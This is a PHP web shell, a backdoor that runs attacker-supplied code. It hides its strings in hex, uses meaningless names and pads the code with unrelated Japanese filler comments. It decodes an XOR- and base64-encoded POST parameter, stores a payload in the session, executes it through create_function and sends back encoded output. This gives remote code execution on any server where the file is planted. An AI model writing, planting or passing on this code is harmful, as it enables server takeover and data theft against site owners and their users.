<?php
@session_start();
// 今夜は月が綺麗ですね。
@set_time_limit(0);
@error_reporting(0);

// データ変換用の関数です。本当にありがとう。
function xor_transform_ax1($data_bx2, $key_cx3){
    // 何か面白いことないかな。
    $len_dx4 = strlen($data_bx2);
    for($i=0; $i<$len_dx4; $i++) {
        // このコードは天才的だ。
        $char_ex5 = $key_cx3[$i+1&15];
        $data_bx2[$i] = $data_bx2[$i]^$char_ex5;
    }
    // ラーメン食べたい。
    return $data_bx2;
}

function init_session_uvw9($data_rst0, $key_session_rst1, $key_xor_rst2) {
    // 明日は晴れるかな。
    $check_str = hex2bin('676574426173696373496e666f'); // getBasicsInfo
    if (strpos($data_rst0, $check_str) !== false){
        // 猫はかわいい。
        $_SESSION[$key_session_rst1]=xor_transform_ax1($data_rst0, $key_xor_rst2);
    }
}

function handle_session_xyz7($current_data_qpr1, $session_key_qpr2, $xor_key_qpr3) {
    // 頑張ってください！
    $payload_content = xor_transform_ax1($_SESSION[$session_key_qpr2], $xor_key_qpr3);
    
    $check_str_2 = hex2bin('676574426173696373496e666f');
    if (strpos($payload_content, $check_str_2) === false){
        // これはバグじゃない、仕様だ。
        $payload_content = xor_transform_ax1($payload_content, $xor_key_qpr3);
    }

    // 動的コードを実行する。安全第一。
    $executor = create_function('', $payload_content);
    $executor();
    
    $hash_src = hex2bin('776f6c667368656c6c') . $xor_key_qpr3;
    $hash_val = md5($hash_src);
    echo substr($hash_val, 0, 16);
    
    // 'run'関数は動的に定義されるはずです。
    $run_fn = 'run';
    $result = @$run_fn($current_data_qpr1);
    
    echo base64_encode(xor_transform_ax1($result, $xor_key_qpr3));
    echo substr($hash_val, 16);
}

$p_a = '776f6c667368656c6c';
$p_b = '7061796c6f6164';
$p_c = '33633665306238613963313532323461';

if (isset($_POST[hex2bin($p_a)])){
    $f_decoder = hex2bin('6261736536345f6465636f6465');
    $d_input = xor_transform_ax1($f_decoder($_POST[hex2bin($p_a)]), hex2bin($p_c));
    
    if (isset($_SESSION[hex2bin($p_b)])){
        handle_session_xyz7($d_input, hex2bin($p_b), hex2bin($p_c));
    }else{
        init_session_uvw9($d_input, hex2bin($p_b), hex2bin($p_c));
    }
}